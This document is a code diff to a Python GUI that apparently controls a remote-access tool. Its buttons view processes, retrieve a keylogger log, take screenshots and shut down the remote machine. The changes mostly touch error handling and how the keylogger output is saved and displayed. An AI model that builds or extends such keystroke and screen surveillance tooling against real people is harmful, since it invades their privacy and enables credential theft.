@@ -1,5 +1,6 @@
 from client import Client
 from client import TMP_PATH
+import os
 import PySimpleGUI as sg
 
 # GUI Layout
@@ -53,8 +54,9 @@ def main():
         try:
           client.end_connection()
           break
-        except ConnectionResetError:
-          break
+        except Exception as e:
+          print(f"[ERROR] {e}")
+          break 
 
       elif event == "View Processes":
         window['OUTPUT'].Update('')
@@ -90,12 +92,14 @@ def main():
 
       elif event == "Print Key Logger":
         window['OUTPUT'].Update('')
-        results = client.print_keylogger()
+        client.save_keylogger()
+        results = ""
+        with open (os.path.join(TMP_PATH, "keylogger.txt"), 'r') as f:
+          results = f.read()
         window['OUTPUT'].update(value=results)
 
       elif event == "Take Screenshot":
         client.take_screenshot()
-        client.save_file(TMP_PATH, 'screenshot.png')
 
       elif event == "Shutdown":
         window['OUTPUT'].Update('')
@@ -104,10 +108,11 @@ def main():
 
     except ConnectionResetError:
       window['OUTPUT'].update(value="Server disconnected")
+    except ConnectionError:
+      window['OUTPUT'].update(value="Server not found")
     except Exception as e:
-      window['OUTPUT'].update(value="Error")
-
-
+      window['OUTPUT'].update(value="Something went wrong")
+    
   window.close()
 
 if __name__ == '__main__':
